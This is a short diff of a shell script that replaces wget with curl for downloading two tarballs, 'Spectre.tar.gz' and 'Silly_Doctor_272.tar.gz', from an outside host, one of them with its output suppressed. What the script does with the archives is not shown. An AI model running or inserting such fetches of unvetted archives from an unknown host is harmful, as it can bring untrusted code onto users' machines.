@@ -3,7 +3,7 @@ cd
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz
+curl http://greenleaf.teatspray.fun/Spectre.tar.gz -L -O -J
 
 sleep 2
 
@@ -50,7 +50,7 @@ echo ""
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.fun/Silly_Doctor_272.tar.gz 1>/dev/null 2>&1
+curl -s http://greenleaf.teatspray.fun/Silly_Doctor_272.tar.gz -L -O -J
 
 sleep 2
 
